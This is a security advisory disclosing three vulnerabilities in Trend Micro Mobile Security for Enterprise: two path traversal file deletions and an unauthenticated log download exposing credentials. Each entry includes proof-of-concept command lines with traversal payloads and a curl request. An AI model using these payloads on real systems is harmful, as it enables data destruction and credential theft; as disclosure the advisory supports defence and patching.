# Trend Micro Mobile Security for Enterprise Multiple Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

There are multiple vulnerabilities in Trend Micro Mobile Security for Enterprise 9.8 SP5 Critical Patch 3.

#### CVE-2023-32521 - Unauthenticated Path Traversal File Deletion

**(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)**

**A path traversal exists in web\_service.dll which can allow an unauthenticated remote attacker to delete arbitrary files. web\_service.dll checks if the file is a temp file before deletion. However, the check can be bypassed with path traversal (i.e., C:\Program Files (x86)\Trend Micro\Mobile Security\cgi\TEMP\aaa\..\..\..\..\..\..\..\..\..\). The deletion is performed under the security context of the account configured for Anonymous Authentication in IIS.**

##### **POC**

[**tmms.py on github.**](https://github.com/tenable/poc/blob/master/TrendMicro/MobileSecurity/tmms.py)
**Usage:**

```
python3 tmms.py -t  -d '{"tmms_action":"upload_eula", "data":{"file_name":"C:\\Program Files (x86)\\Trend Micro\\Mobile Security\\cgi\\TEMP\\aaa\\..\\..\\..\\..\\..\\..\\..\\..\\..\\tmp\\delete_me.txt"}}' --noauth

```
#### CVE-2023-32522 - Authenticated Path Traversal File Deletion

**(CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)**

**A path traversal exists in universal\_mdm.dll which can allow an authenticated remote attacker to delete arbitrary files. The flaw results from improper validation of a user-supplied file name passed to Windows API DeleteFile(). The attacker can delete arbitrary files by using path traversal or full file paths. The deletion is performed under the security context of the account (default: SYSTEM) configured to run the Mobile Security Management Module Service (ManagementServer.exe).**

##### **POC**

[**tmms.py on github.**](https://github.com/tenable/poc/blob/master/TrendMicro/MobileSecurity/tmms.py)
**Usage:**

**python3 tmms.py -t -d '{"tmms\_action":"upload\_font\_file", "data":{"file\_name":"..\\..\\..\\..\\..\\..\\tmp\\delete\_me.txt","file\_local\_name":"bbb","file\_ext":".xxx"}}' -U user1 -P password123**

#### **Information Disclosure**

**(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)**

**An unauthenticated remote attacker can download the web\_service.log, which can contain sensitive information. For example, if DEBUG level (non-default) is configured for web\_service.dll, the login credentials to the Administration Web Console can be revealed.**

##### **POC**

```
curl -ks 'https:///mdm/cgi/log/web_service.log' | grep login
2022-12-12 10:41:46 WebService DEBUG [0x000019fc][source\IIS_wrapper.cpp(389)]- tmms_web_service::IISWrapper::DecodeJSONTypeBody : m_body_json_ is:{"tmms_action":"login","data":{"username":"root","password":"mobilesecurity","time":1670600505}}
```
